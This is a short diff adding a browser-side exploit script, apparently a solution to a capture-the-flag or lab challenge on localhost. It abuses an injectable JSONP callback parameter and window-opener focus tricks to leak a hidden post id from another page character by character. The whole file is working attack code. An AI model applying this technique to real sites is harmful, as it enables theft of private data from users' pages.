@@ -1,0 +1,20 @@
+<script>
+    const sleep = d => new Promise(r => setTimeout(r, d));
+
+    const main = async () => {
+        await sleep(1000);
+
+        // 32 is the start of the href url that contains id
+        // 36 is the len of the id
+        for (var i = 32; i <= 32+36+1; i++) {
+            // I'm explainig this payload below
+            PAYLOAD = `opener[opener.opener.document.body.children[1].childNodes[1].children[0].children[0].children[3].children[0].children[0].children[0].href[${i}]].focus`;
+            // change c.html page's location to the vulnerable page that executes callback
+            opener.location.replace(`http://localhost:12345/post/?id=24bc9bc5-844c-4f37-8330-f3dbadd2e3a3?callback=${PAYLOAD}%23%00`);
+            // check the next character every 1.5 secs so that the page have 1.5 sec to load.
+            await sleep(1500);
+        }
+    }
+
+    main();
+</script>
